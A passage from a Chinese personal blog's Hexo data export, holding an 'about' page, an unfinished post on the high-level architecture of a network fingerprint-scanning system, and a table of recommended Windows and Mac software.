最近也开始寻找实习以及正式工作(偏向于安全研发或者是软件开发)；\n> 如果对我感兴趣可以联系nanshihui@gmail.com。\n\n<div class=\"player\">\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=350 height=330 src=\"http://music.163.com/outchain/player?type=0&id=147897088&auto=0&height=430\"></iframe>\n</div>\n\n<ul class=\"ds-recent-visitors\" data-num-items=\"30\" data-avatar-size=\"56\"></ul>\n","source":"about/index.md","raw":"title: 关于我 & 留言板\ndate: 2015-09-30 20:31:36\nfancybox: false\n---\n\n<style type=\"text/css\">\n\tstrong a {\n\t\tcolor: #747474;\n\t}\n\t.player {\n\t\ttext-align: center;\n\t\tmargin: .5em auto 0;\n\t}\n\t.player br {\n\t\tdisplay: none;\n\t}\n\t.sign {\n\t\ttext-align: right;\n\t\tfont-style: italic;\n\t}\n\t#ds-recent-visitors {\n\t\tmargin: 0;\n\t\tpadding: 0;\n\t}\n\t#ds-recent-visitors div img {\n\t\tdisplay: inline-block !important;\n\t\twidth: 56px !important;\n\t\theight: 56px !important;\n\t\tborder-radius: 50%;\n\t\tborder: 1px solid #ddd;\n\t\tpadding: 2px;\n\t}\n\t.article-entry img:first-child {\n\t\tdisplay: block;\n\t}\n\t.article-entry span {\n\t\tfont-family: Arial;\n\t}\n</style>\n\n---\n\n　　**2015年8月，毕业后，终于明确了自己真正所热衷的事，并找到了与之匹配的职业 <span>——</span> 为开始利用业余时间，努力钻研，希望这一天尽早到来！**\n\n<p class=\"sign\"><span>——</span> Sherwel, 2015年9月30日</p>\n\n\n\n**开博缘由:**\n> 在建立改造博客网站的过程中，学习和巩固基本知识；\n> 通过写博客的方式，加深理解，显性化自己的隐性知识；\n> 共享知识，吸引同好，交流进步。\n\n**[文章-博客站点建设历程:](/2015/08/20/blog-building/)**\n> 本篇日志用于归纳记录自己在学习建设个人博客站点中的各种尝试和思考。为方便编辑和查看最新进展，更新以倒序方式呈现。\n\n**[文章-个人学习路线:](/2015/08/28/Front-End-Study/)**\n> 简单记录个人学习过程中使用的教程和书籍。仅列出较系统和专业化的资料，不包括网上零散的文章和教程。\n\n\n\n\n\n**欢迎交流:**\n> 个人邮件及社交网站等信息见边栏底部；\n> 有什么留言或问题直接在文末留下评论即可。\n\n**写在最近:**\n> 最近也开始寻找实习以及正式工作(偏向于安全研发或者是软件开发)；\n> 如果对我感兴趣可以联系nanshihui@gmail.com。\n\n<div class=\"player\">\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=350 height=330 src=\"http://music.163.com/outchain/player?type=0&id=147897088&auto=0&height=430\"></iframe>\n</div>\n\n<ul class=\"ds-recent-visitors\" data-num-items=\"30\" data-avatar-size=\"56\"></ul>\n","updated":"2016-05-02T08:40:13.000Z","path":"about/index.html","comments":1,"layout":"page","_id":"ciyr5276a00032xhp1pouczpk"}],"Post":[{"title":"如何构建一个网络空间指纹识别系统（一）","date":"2016-01-15T10:28:36.000Z","_content":"<h2 id=\"intro\">前言</h2>仅记录在开发过程中的思考和理解\n\n### 如何构建一个网络空间指纹系统\n- **整体架构:** 整体搭建的结构；\n- **任务调度:** 怎样让多个扫描合理的去扫描而不错乱；\n- **扫描器构造:** 使用哪些指纹库，如何写出适合自己的扫描器；\n- **存储归类:** 怎么处理获得的凌乱的数据；\n- **攻击框架:** 如何发现网站的表示，以及快速发现网络的漏洞；\n- **其他:** 想改进的地方；\n\n<!-- more -->\n## 引言\n　　有不少人都看过网络空间指纹扫描的系统，用户只要轻轻的一点，就能检索出，自己要求组件的主机信息。有不少人也很好奇这是怎么实现的，同样我也是，于是自己就开始动手，因此也就有了下文。当然水平有限，有些地方表述不一定正确，如果有什么地方存在不足，欢迎指正。\n## 整体架构\n　　整体的架构主要分为调度框架、ES存储、UI呈现等模块。\n　　然而最核心的部分（调度框架）可以简化为两个工人集群。一个是抓取信息部分，另一个是处理信息。其中一批量爬虫工负责从任务池中接收任务，并抓取信息。另一批专门负责处理。有点类似于生产者与消费者。要构建这么一个系统，我们只要多个线程就能解决。但是如果我们想要变成一个集群的话，那思路略有不同。\n　　我们在服务器中，首先要提供一个接口，负责当前访问的工人分配任务。当工人接收到任务的时候，接着就去完成任务，等到任务做好后，将得到的数据，重新提交给服务器。由服务器负责，将数据存储起来。同样的思维，处理信息的工作群也是这样的思路。这样整个雏形就出来了。\n　　为了提高访问的速度以及使得信息能快速得到反馈，我们可以把工人反馈的任务在存储到数据库的同时，也把用户频繁检索所对应的数据，存入redis。这样，用户在检索的时候，首先去redis里面查找，如果找不到的话，就会去数据库里面找，如果还是找不到的话，才创建一个任务，并让工人类去执行任务。\n　　如果不熟悉这样的操作方式的话，类似的思路可以去参考一下scapy，他的整体框架也是两批爬虫，一批负责爬取，一批负责存储，或者处理。\n　　\n## 任务调度\n　　任务调度常见的就是多线程/多进程,不过由于Python语言在多线程的实现上采用了全局锁,使得即使你采用多线程,也只能够在单核上跑.因此出现了多进程和协程的结合方式。常见的Python的调度框架有很多,如果你仔细去看的话,就会发现他们的实现方式有很多共同性,他们的整体逻辑就是一个队列和工人,然后根据需要处理完任务,是否返回其他操作。所以你也完全可以自己是定制一个适合自己的实现方式。\n\n　　未完待续。。。","source":"_posts/网络空间指纹识别.md","raw":"---\ntitle: 如何构建一个网络空间指纹识别系统（一）\ndate: 2016-01-15 18:28:36\ncategories:\n- Web安全\ntag:\n- Zmap\n- Nmap\n- 爬虫\n- Python\n---\n<h2 id=\"intro\">前言</h2>仅记录在开发过程中的思考和理解\n\n### 如何构建一个网络空间指纹系统\n- **整体架构:** 整体搭建的结构；\n- **任务调度:** 怎样让多个扫描合理的去扫描而不错乱；\n- **扫描器构造:** 使用哪些指纹库，如何写出适合自己的扫描器；\n- **存储归类:** 怎么处理获得的凌乱的数据；\n- **攻击框架:** 如何发现网站的表示，以及快速发现网络的漏洞；\n- **其他:** 想改进的地方；\n\n<!-- more -->\n## 引言\n　　有不少人都看过网络空间指纹扫描的系统，用户只要轻轻的一点，就能检索出，自己要求组件的主机信息。有不少人也很好奇这是怎么实现的，同样我也是，于是自己就开始动手，因此也就有了下文。当然水平有限，有些地方表述不一定正确，如果有什么地方存在不足，欢迎指正。\n## 整体架构\n　　整体的架构主要分为调度框架、ES存储、UI呈现等模块。\n　　然而最核心的部分（调度框架）可以简化为两个工人集群。一个是抓取信息部分，另一个是处理信息。其中一批量爬虫工负责从任务池中接收任务，并抓取信息。另一批专门负责处理。有点类似于生产者与消费者。要构建这么一个系统，我们只要多个线程就能解决。但是如果我们想要变成一个集群的话，那思路略有不同。\n　　我们在服务器中，首先要提供一个接口，负责当前访问的工人分配任务。当工人接收到任务的时候，接着就去完成任务，等到任务做好后，将得到的数据，重新提交给服务器。由服务器负责，将数据存储起来。同样的思维，处理信息的工作群也是这样的思路。这样整个雏形就出来了。\n　　为了提高访问的速度以及使得信息能快速得到反馈，我们可以把工人反馈的任务在存储到数据库的同时，也把用户频繁检索所对应的数据，存入redis。这样，用户在检索的时候，首先去redis里面查找，如果找不到的话，就会去数据库里面找，如果还是找不到的话，才创建一个任务，并让工人类去执行任务。\n　　如果不熟悉这样的操作方式的话，类似的思路可以去参考一下scapy，他的整体框架也是两批爬虫，一批负责爬取，一批负责存储，或者处理。\n　　\n## 任务调度\n　　任务调度常见的就是多线程/多进程,不过由于Python语言在多线程的实现上采用了全局锁,使得即使你采用多线程,也只能够在单核上跑.因此出现了多进程和协程的结合方式。常见的Python的调度框架有很多,如果你仔细去看的话,就会发现他们的实现方式有很多共同性,他们的整体逻辑就是一个队列和工人,然后根据需要处理完任务,是否返回其他操作。所以你也完全可以自己是定制一个适合自己的实现方式。\n\n　　未完待续。。。","slug":"网络空间指纹识别","published":1,"updated":"2016-06-29T02:09:15.521Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr5276v00042xhps3ypc097"},{"title":"自用 Windows 和 Mac 软件推荐","date":"2016-01-07T16:00:00.000Z","_content":"\n<h2 id=\"intro\">前言</h2>罗列自己正在使用的 Windows 和 Mac OS 软件，基本上都是同类中能较好满足个人需求的软件，作表记录，方便自己检索，也顺便推荐给大家。\n\n### 软件分类说明\n- **编程开发:** 目前写代码用到的一些软件；\n- **网络应用:** 依赖于网络运行的软件，比如浏览器，聊天软件，下载工具等；\n- **文档处理:** 查看和处理 Word, Excel, PDF 等文档；\n- **影音图像:** 查看和处理多媒体文件，比如看图，听歌，视频处理等；\n- **系统工具:** 增强、个性化系统或者系统自带软件的功能，比如资源管理器增强，任务栏个性化等；\n- **应用软件:** 不属于以上分类的软件；\n\n<!-- more -->\n\n### 表格内容解释\n- 表格依次列出软件名字，开发商，系统，付费，备注，默认使用软件的最新版本。\n- **表头英文:** 用不留空的英文单词表示，避免默认设置下表头被换行；\n- **系统栏打 √ :** 主要在该系统下使用该软件，少数双系统下都频繁使用；\n- **系统栏标 — :** 该软件不支持该系统；\n- **Free 免费栏 :** 标 x 该软件为付费共享软件；标 — 表示提供免费版，但功能等有所限制。\n- **链接:** 点击软件名字跳转到软件主页，点开发商跳转到对其介绍页面或者对应官网。\n- **Note 备注:** 软件用途简单介绍\n\n## 编程开发\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[GitHub Desktop](https://desktop.github.com/)|[GitHub, Inc.](https://en.wikipedia.org/wiki/GitHub)|√|||GitHub 桌面版\n2|[Sublime Text 3](http://www.sublimetext.com/)|[Jon Skinner](https://en.wikipedia.org/wiki/Sublime_Text)||√|—|代码编辑器\n3|[Brackets](http://brackets.io/)|[Adobe Systems](http://is.gd/q5bGeJ)|√|||Web 代码编辑器\n4|[Dash](https://kapeli.com/dash)|[Kapeli](https://kapeli.com/)|√|—|x|API Snippet 代码管理\n5|[Flux V](http://www.theescapers.com/flux/)|[Escapers Ltd.](http://www.theescapers.com/)|√|—|x|可视化网页开发\n6|[XAMPP](https://www.apachefriends.org/zh_cn/index.html)|[Apache Friends](https://www.apachefriends.org)||√||PHP 开发环境，本地 WordPress\n7|[Git](http://www.git-scm.com/)|[Linus Torvalds](https://en.wikipedia.org/wiki/Linus_Torvalds)||√||Distributed version control system\n8|[ColorSnapper](http://colorsnapper.com/)|[Koolesache](http://colorsnapper.com/)|√|—|x|屏幕取色器\n9|[Node.js](https://nodejs.org/en/)|[Joyent, Inc.](https://en.wikipedia.org/wiki/Node.js)|√|√||JavaScript runtime\n\n\n\n## 网络应用\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[Chrome](http://www.google.com/chrome/)|[谷歌](http://baike.baidu.com/view/105.htm)|√|||主力浏览器，插件脚本扩展\n2|[QQ](http://im.qq.com/)|[腾讯](http://baike.baidu.com/view/1591.htm)|√|√|—|万年隐身\n3|[ShadowsocksX](http://shadowsocks.org/en/index.html)|[clowwindy](https://github.com/clowwindy)|√|√||和FQ谐\n4|[Thunder Store](http://mac.xunlei.com/app/)|[迅雷网络](http://baike.baidu.com/view/467578.htm)|√|—||检查应用更新\n5|[阿里旺旺](http://wangwang.taobao.com/)|[阿里巴巴集团](http://baike.baidu.com/view/1247049.htm)|√|||买买买\n6|[坚果云](https://jianguoyun.com/)|[上海亦存网络](http://baike.baidu.com/view/8051910.htm)|√|√|—|文档同步，备用\n7|[迅雷](http://dl.xunlei.com/)|[迅雷网络](http://baike.baidu.com/view/467578.htm)|√|√|—|极速版，离线下载和高速通道\n8|[FLVCD 硕鼠](http://www.flvcd.com/index.htm)| |√|||网络视频下载\n9|[微信](http://weixin.qq.com/)|[腾讯](http://baike.baidu.com/view/1591.htm)|√|||聊胜于无\n10|[Maxthon 傲游](http://www.maxthon.cn/)|[傲游天下](http://www.maxthon.cn/company/)||√||备用\n11|[百度云管家](http://pan.baidu.com/disk/download/guanjia/)|[百度](http://baike.baidu.com/view/262.htm)||√|—|搜集、分享资源\n12|[ADSafe 净网大师](http://www.ad-safe.com/)|[大摩网络](http://www.ad-safe.com/)|—|√||网页、视频广告屏蔽\n13|[网易云音乐](http://music.163.com/#/download)|[网易公司](http://baike.baidu.com/view/149363.htm)|√||—|看评论听歌，发现好歌\n14|[360云盘](http://yunpan.360.cn/)|[奇虎360](http://baike.baidu.com/view/1458023.htm)|√||—|主力同步软件，容量足够，带历史版本，文件数量不限\n15|[TeamViewer](www.teamviewer.com)|[TeamViewer GmbH](https://en.wikipedia.org/wiki/TeamViewer)|√|√||远程桌面控制\n16|[Reeder 3](http://reederapp.com/mac/)|[Silvio Rizzi](https://itunes.apple.com/us/app/reeder-3/id880001334?ls=1&mt=12)|√|—|x|RSS 订阅\n\n\n\n## 文档处理\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[Endnote](http://endnote.com/)|[Thomson Reuters](https://en.wikipedia.org/wiki/EndNote)| |√|√|Reference 文献管理\n2|[Office 2016](http://is.gd/SjAbs5)|[微软公司](http://baike.baidu.com/view/2353.htm)| |√||Word , Excel, PowerPoint, OneNote\n3|[Nitro PDF Pro](https://www.gonitro.com/)|[Nitro](https://en.wikipedia.org/wiki/Nitro_PDF)| |√||PDF编辑\n4|[印象笔记](https://www.yinxiang.com/)|[Evernote](http://baike.baidu.com/view/8548200.htm)|√||—|网文搜集\n5|[Calibre](http://www.calibre-ebook.com/)|[Kovid Goyal](http://is.gd/V4FSaf)|√|||电子书管理\n6|[Mou](http://25.io/mou/)|[25.io Inc](http://25.io)|√|—||Markdown 编辑器\n7|[Sigil](http://sigil-ebook.com/)|[John Schember](http://is.gd/bDKF8D)|√|||epub 电子书制作\n8|[XMind](www.xmind.net)|[XMind Ltd.](https://en.wikipedia.org/wiki/XMind)|√||x|思维导图制作\n9|[FileLocator](https://www.mythicsoft.com/filelocatorpro)|[Mythicsoft Ltd.](https://www.mythicsoft.com/info/aboutus)|—|√|—|全文检索工具 支持正则表达式\n10|[福昕阅读器](http://www.foxitsoftware.cn/products/reader/)|[福昕软件](http://www.foxitsoftware.cn/company/)|—|√||PDF 阅读器\n11|[Everything](http://www.voidtools.com/)|[David Carpenter](http://is.gd/avswMs)|—|√||文件名搜索\n12|[PSP Comic Helper](https://code.google.com/p/psp-comic-helper/)|鱼蛋|—|√||漫画分割转换\n13|[字幕转换助手](http://23192069.qzone.qq.com/2)|[poseidon](http://user.qzone.qq.com/23192069)|—|√|—|多格式字幕互转\n14|[PDFBinder](https://code.google.com/p/pdfbinder/)| |—|√||PDF 合并工具\n15|[MoodPad](http://pan.baidu.com/s/1o6EJuiA)| |—|√||追月文本处理 i254\n16|[拖把更名器](http://is.gd/11CoRf)| |—|√||批量重命名\n17|[ANSI2Unicode](http://kuyur.info/blog/archives/1388)|[小熏](http://kuyur.info/blog/)|—|√||CUE 乱码修复，编码转换\n18|[SrtEdit](http://is.gd/KgzGwF)|袁卫国|—|√||字幕编辑器\n19|[Subindex](http://blog.csdn.net/redbirdli/article/category/182219)|火鸟|—|√||火鸟字幕合并\n\n## 系统工具\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[Clover](http://cn.ejie.me/)|易捷科技|—|√||多标签资源管理器\n2|[Listary](http://www.listary.com/)|Bopsoft|—|√|x|资源管理器增强\n3|[StrokeIt](http://www.tcbmi.com/strokeit/)|Jeff Doozan|—|√||鼠标手势\n4|[Alfred](https://www.alfredapp.com/)|Running with Crayons|√|—|—|搜索快捷键增强\n5|[Bartender](http://www.macbartender.com/)|[Surtees Studios](http://www.surteesstudios.com/about/)|√|—|—|任务栏瘦身\n6|[BetterTouchTool](http://www.bettertouchtool.net/)|[Andreas Hegenberg](http://blog.boastr.net/)|√|—||触控板手势\n7|[ClipMenu](http://www.clipmenu.com/)|[Naotaka Morimoto](http://www.naotaka.com/)|√|—|—|剪贴板增强\n8|[Day-O](http://www.shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock)|[Shaun Inman](http://www.shauninman.com/pendium/)|√|—||菜单栏日历\n9|[PopClip](https://pilotmoon.com/popclip/)|[Pilotmoon](https://pilotmoon.com/)|√|—|x|弹出菜单 效率 鼠标\n10|[Total Manager](http://www.totalrar.com/total-manager.html)|etinysoft|√|—|x|Finder 增强\n11|[XtraFinder](https://www.trankynam.com/xtrafinder/)|[Tran Ky Nam](https://www.trankynam.com)|√|—||Finder 增强\n12|[Unclutter](http://unclutterapp.com/)|Eugene Krupnov|√|—|x|临时存储，替代桌面\n13|[DirectX Repair](http://www.xiazaiba.com/html/6081.html)| |—|√||DLL 修复\n14|[iStat Menus](https://bjango.com/mac/istatmenus/)|[Bjango Pty Ltd.](https://bjango.com/)|√|—|x|系统与硬件监控\n15|[NTFS for Mac](https://www.paragon-software.com/home/ntfs-mac/)|[Paragon Software Group](https://www.paragon-software.com/about.htm)|√|—|x|磁盘格式兼容\n16|[软媒时间](http://sj.ruanmei.com/)|[软媒](http://www.ruanmei.com/)|—|√||任务栏时间 农历 天气\n17|[通用PE工具箱](http://www.tongyongpe.com/)|[UEPON](http://weibo.com/uepon)|—|√||v5.0 系统安装\n18|[Disk Speed Test](https://itunes.apple.com/us/app/blackmagic-disk-speed-test/id425264550?mt=12)|[Blackmagic Design Inc](https://www.blackmagicdesign.com/)|√|—||硬盘测速\n19|[FolderSizes](http://www.foldersizes.com/)|[Key Metric Software](http://www.keymetricsoft.com/)|—|√|x|文件夹、文件空间占用分析\n20|[Recuva](https://www.piriform.com/recuva)|[Piriform](https://www.piriform.com/about)|—|√|x|数据恢复\n21|[GoodSync](http://www.goodsync.com/)|Siber Systems Inc.||√|x|本地文件同步\n22|[CheatSheet](http://www.mediaatelier.com/CheatSheet/)| |√|—||快捷键显示\n\n## 影音图像\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[Media Preview](http://www.babelsoft.net/products.htm)|[博语软件](http://www.babelsoft.net/)|—|√||资源管理器 视频缩略图\n2|[CUE Splitter](http://www.enfis.it/cue-splitter-tutorial/)|[Medieval Software](http://www.medieval.it/)|—|√||无损音乐分割\n3|[Mp3tag](http://www.mp3tag.de/en/)|Florian Heidenreich|—|√||MP3标签修改 去乱码\n4|[PotPlayer](https://en.wikipedia.org/wiki/PotPlayer)|[Daum Communications](https://en.wikipedia.org/wiki/Kakao)|—|√||视频播放\n5|[2345看图王](http://pic.2345.com/)|[2345.com](2345.com)|—|√||图片浏览\n6|[魔方图标大师](http://www.pc6.com/softview/SoftView_77375.html)|[软媒](http://www.ruanmei.com/)|—|√||图标处理\n7|[全能音频转换通](http://www.crsky.com/soft/28076.html)| |—|√||v1.2\n8|[Adobe Photoshop](https://en.wikipedia.org/wiki/Adobe_Photoshop)|[Adobe Systems](https://en.wikipedia.org/wiki/Adobe_Systems)|√||x|图像处理\n9|[ArcSoft Photo+](http://www.arcsoft.com/photoplus/)|[ArcSoft](https://en.wikipedia.org/wiki/ArcSoft)|√|—||图片浏览\n10|[Inpaint](https://en.wikipedia.org/wiki/Inpaint)|[Maxim Gapchenko](http://www.theinpaint.com/)|√||x|抠图，去背景\n11|[ScreenFlow](https://en.wikipedia.org/wiki/ScreenFlow)|[Telestream, Inc.](http://www.telestream.net/company/overview.htm)|√|—|x|屏幕录制\n12|[FastStone Capture](http://www.faststone.org/FSCaptureDetail.htm)|[FastStone Soft](http://www.faststone.org/)|—|√|x|截图\n13|[SplitIt](http://baike.baidu.com/view/2343158.htm)|[poseidon](http://user.qzone.qq.com/23192069)|—|√|—|影音剪切合并\n14|[Xee](http://xee.c3.cx/)|[Dag Ågren](http://wakaba.c3.cx/s/)|√|—|x|图片浏览\n15|[GIF动画录制精灵](http://www.shuimiao.net/info.asp?id=157)|[水淼软件](http://www.shuimiao.net/)|—|√||\n16|[MangaMeeya](http://baike.baidu.com/view/647184.htm)|Manga Underground|—|√||漫画阅读\n17|[PhotoZoom](http://www.benvista.com/photozoompro)|[BenVista Ltd.](http://www.benvista.com/aboutus)||√|x|图片无损缩放\n18|[Snip](http://www.snip.qq.com/)|[腾讯](http://baike.baidu.com/view/1591.htm)|√|—||截图\n19|[Covered](https://itunes.apple.com/us/app/covered/id860548294?mt=12)|[Rob Heague](http://robheague.com/)|√|—||专辑封面下载\n20|[MediaCoder](http://mediacoder.com.cn/)|Stanley Huang|—|√||音视频转码\n21|[MKVToolnix](https://www.bunkus.org/videotools/mkvtoolnix/)|[Moritz Bunkus](https://www.bunkus.org/blog/)||√||视频音频字幕处理\n22|[iSmartPhoto](https://itunes.apple.com/app/id940107333)|Chi Lin|√|—|x|图片管理\n23|[CollageIt](http://www.collageitfree.com/)|PearlMountain|√|||拼图\n24|[暴风影音](https://itunes.apple.com/cn/app/bao-feng-ying-yin/id1035547244?mt=12)|[暴风科技](http://www.baofeng.com/)|√|||Mac 版很简洁\n25|[MPlayerX](http://mplayerx.org/)|[Zongyao Qu](http://blog.mplayerx.org/)|√|—||视频播放\n\n## 应用软件\n\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[BetterZip](http://www.betterzip.com/)|[MacItBetter](http://macitbetter.com/)|√|—|x|解压缩\n2|[2345好压](http://haozip.2345.com/)|[2345.com](2345.com)|—|√||解压缩\n3|[BlackBerry Blend](http://us.blackberry.com/software/desktop/blackberry-blend.html)|[BlackBerry](http://us.blackberry.com/)|√|||黑莓文件管理\n4|[Noizio](http://www.noiz.io/)|noiz.io|√|—||白噪音 声效\n5|[OmniFocus](https://www.omnigroup.com/omnifocus/)|[The Omni Group](https://en.wikipedia.org/wiki/The_Omni_Group)|√|—|x|GTD、任务管理\n6|[Parallels Desktop](http://www.parallelsdesktop.cn/)|[Parallels](http://www.dwz.cn/27tepC)|√|—|x|虚拟机\n7|[RescueTime](https://www.rescuetime.com)| |√|√|—|时间流水记录\n8|[Sachesi](https://github.com/xsacha/Sachesi)|[xsacha](https://github.com/xsacha)|√|||黑莓刷机\n9|[搜狗输入法](http://pinyin.sogou.com/)|[搜狗](http://corp.sogou.com/)|√|√||\n10|[易呗背单词](http://www.yibei.com/software)|[易呗](http://www.yibei.com/)|√|||\n11|[朗读女](http://www.443w.com/tts/)|[阿嘉](http://www.443w.com/)| |√||语音朗读\n12|[同步助手](http://www.tongbusj.com/)|宇通博软件||√||iOS 设备管理\n13|[有道词典](http://dict.youdao.com/)|[网易公司](http://baike.baidu.com/view/149363.htm)| |√||\n14|[Anki](http://ankisrs.net/)|[Damien Elmes](http://ichi2.net/)| |√||卡片辅助记忆\n\n","source":"_posts/windows-mac-software.md","raw":"title: 自用 Windows 和 Mac 软件推荐\ndate: 2016-01-08\ncategories:\n- 杂碎\ntags:\n- Windows\n- Mac\n- Software\npermalink: windows-mac-software\n---\n\n<h2 id=\"intro\">前言</h2>罗列自己正在使用的 Windows 和 Mac OS 软件，基本上都是同类中能较好满足个人需求的软件，作表记录，方便自己检索，也顺便推荐给大家。\n\n### 软件分类说明\n- **编程开发:** 目前写代码用到的一些软件；\n- **网络应用:** 依赖于网络运行的软件，比如浏览器，聊天软件，下载工具等；\n- **文档处理:** 查看和处理 Word, Excel, PDF 等文档；\n- **影音图像:** 查看和处理多媒体文件，比如看图，听歌，视频处理等；\n- **系统工具:** 增强、个性化系统或者系统自带软件的功能，比如资源管理器增强，任务栏个性化等；\n- **应用软件:** 不属于以上分类的软件；\n\n<!-- more -->\n\n### 表格内容解释\n- 表格依次列出软件名字，开发商，系统，付费，备注，默认使用软件的最新版本。\n- **表头英文:** 用不留空的英文单词表示，避免默认设置下表头被换行；\n- **系统栏打 √ :** 主要在该系统下使用该软件，少数双系统下都频繁使用；\n- **系统栏标 — :** 该软件不支持该系统；\n- **Free 免费栏 :** 标 x 该软件为付费共享软件；标 — 表示提供免费版，但功能等有所限制。\n- **链接:** 点击软件名字跳转到软件主页，点开发商跳转到对其介绍页面或者对应官网。\n- **Note 备注:** 软件用途简单介绍\n\n## 编程开发\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[GitHub Desktop](https://desktop.github.com/)|[GitHub, Inc.](https://en.wikipedia.org/wiki/GitHub)|√|||GitHub 桌面版\n2|[Sublime Text 3](http://www.sublimetext.com/)|[Jon Skinner](https://en.wikipedia.org/wiki/Sublime_Text)||√|—|代码编辑器\n3|[Brackets](http://brackets.io/)|[Adobe Systems](http://is.gd/q5bGeJ)|√|||Web 代码编辑器\n4|[Dash](https://kapeli.com/dash)|[Kapeli](https://kapeli.com/)|√|—|x|API Snippet 代码管理\n5|[Flux V](http://www.theescapers.com/flux/)|[Escapers Ltd.](http://www.theescapers.com/)|√|—|x|可视化网页开发\n6|[XAMPP](https://www.apachefriends.org/zh_cn/index.html)|[Apache Friends](https://www.apachefriends.org)||√||PHP 开发环境，本地 WordPress\n7|[Git](http://www.git-scm.com/)|[Linus Torvalds](https://en.wikipedia.org/wiki/Linus_Torvalds)||√||Distributed version control system\n8|[ColorSnapper](http://colorsnapper.com/)|[Koolesache](http://colorsnapper.com/)|√|—|x|屏幕取色器\n9|[Node.js](https://nodejs.org/en/)|[Joyent, Inc.](https://en.wikipedia.org/wiki/Node.js)|√|√||JavaScript runtime\n\n\n\n## 网络应用\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[Chrome](http://www.google.com/chrome/)|[谷歌](http://baike.baidu.com/view/105.htm)|√|||主力浏览器，插件脚本扩展\n2|[QQ](http://im.qq.com/)|[腾讯](http://baike.baidu.com/view/1591.htm)|√|√|—|万年隐身\n3|[ShadowsocksX](http://shadowsocks.org/en/index.html)|[clowwindy](https://github.com/clowwindy)|√|√||和FQ谐\n4|[Thunder Store](http://mac.xunlei.com/app/)|[迅雷网络](http://baike.baidu.com/view/467578.htm)|√|—||检查应用更新\n5|[阿里旺旺](http://wangwang.taobao.com/)|[阿里巴巴集团](http://baike.baidu.com/view/1247049.htm)|√|||买买买\n6|[坚果云](https://jianguoyun.com/)|[上海亦存网络](http://baike.baidu.com/view/8051910.htm)|√|√|—|文档同步，备用\n7|[迅雷](http://dl.xunlei.com/)|[迅雷网络](http://baike.baidu.com/view/467578.htm)|√|√|—|极速版，离线下载和高速通道\n8|[FLVCD 硕鼠](http://www.flvcd.com/index.htm)| |√|||网络视频下载\n9|[微信](http://weixin.qq.com/)|[腾讯](http://baike.baidu.com/view/1591.htm)|√|||聊胜于无\n10|[Maxthon 傲游](http://www.maxthon.cn/)|[傲游天下](http://www.maxthon.cn/company/)||√||备用\n11|[百度云管家](http://pan.baidu.com/disk/download/guanjia/)|[百度](http://baike.baidu.com/view/262.htm)||√|—|搜集、分享资源\n12|[ADSafe 净网大师](http://www.ad-safe.com/)|[大摩网络](http://www.ad-safe.com/)|—|√||网页、视频广告屏蔽\n13|[网易云音乐](http://music.163.com/#/download)|[网易公司](http://baike.baidu.com/view/149363.htm)|√||—|看评论听歌，发现好歌\n14|[360云盘](http://yunpan.360.cn/)|[奇虎360](http://baike.baidu.com/view/1458023.htm)|√||—|主力同步软件，容量足够，带历史版本，文件数量不限\n15|[TeamViewer](www.teamviewer.com)|[TeamViewer GmbH](https://en.wikipedia.org/wiki/TeamViewer)|√|√||远程桌面控制\n16|[Reeder 3](http://reederapp.com/mac/)|[Silvio Rizzi](https://itunes.apple.com/us/app/reeder-3/id880001334?ls=1&mt=12)|√|—|x|RSS 订阅\n\n\n\n## 文档处理\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[Endnote](http://endnote.com/)|[Thomson Reuters](https://en.wikipedia.org/wiki/EndNote)| |√|√|Reference 文献管理\n2|[Office 2016](http://is.gd/SjAbs5)|[微软公司](http://baike.baidu.com/view/2353.htm)| |√||Word , Excel, PowerPoint, OneNote\n3|[Nitro PDF Pro](https://www.gonitro.com/)|[Nitro](https://en.wikipedia.org/wiki/Nitro_PDF)| |√||PDF编辑\n4|[印象笔记](https://www.yinxiang.com/)|[Evernote](http://baike.baidu.com/view/8548200.htm)|√||—|网文搜集\n5|[Calibre](http://www.calibre-ebook.com/)|[Kovid Goyal](http://is.gd/V4FSaf)|√|||电子书管理\n6|[Mou](http://25.io/mou/)|[25.io Inc](http://25.io)|√|—||Markdown 编辑器\n7|[Sigil](http://sigil-ebook.com/)|[John Schember](http://is.gd/bDKF8D)|√|||epub 电子书制作\n8|[XMind](www.xmind.net)|[XMind Ltd.](https://en.wikipedia.org/wiki/XMind)|√||x|思维导图制作\n9|[FileLocator](https://www.mythicsoft.com/filelocatorpro)|[Mythicsoft Ltd.](https://www.mythicsoft.com/info/aboutus)|—|√|—|全文检索工具 支持正则表达式\n10|[福昕阅读器](http://www.foxitsoftware.cn/products/reader/)|[福昕软件](http://www.foxitsoftware.cn/company/)|—|√||PDF 阅读器\n11|[Everything](http://www.voidtools.com/)|[David Carpenter](http://is.gd/avswMs)|—|√||文件名搜索\n12|[PSP Comic Helper](https://code.google.com/p/psp-comic-helper/)|鱼蛋|—|√||漫画分割转换\n13|[字幕转换助手](http://23192069.qzone.qq.com/2)|[poseidon](http://user.qzone.qq.com/23192069)|—|√|—|多格式字幕互转\n14|[PDFBinder](https://code.google.com/p/pdfbinder/)| |—|√||PDF 合并工具\n15|[MoodPad](http://pan.baidu.com/s/1o6EJuiA)| |—|√||追月文本处理 i254\n16|[拖把更名器](http://is.gd/11CoRf)| 